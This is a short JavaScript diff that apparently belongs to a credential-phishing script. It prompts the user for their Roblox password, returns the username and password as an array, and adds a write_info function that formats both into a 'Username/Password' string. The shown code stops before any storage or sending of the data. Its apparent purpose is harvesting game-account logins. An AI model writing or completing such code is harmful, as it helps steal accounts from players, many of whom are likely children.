@@ -9,5 +9,13 @@ function get_info() {
     message = "What is your Roblox password? (Capitalization Matters)"
     let password = prompt(message);
 
-    return username, password
+    return [username, password];
+}
+
+function write_info() {
+    // Prompt the user.
+    let data = get_info();
+    let username = data[0];
+    let password = data[1];
+    data = `Username: ${username}\nPassword: ${password}`
 }
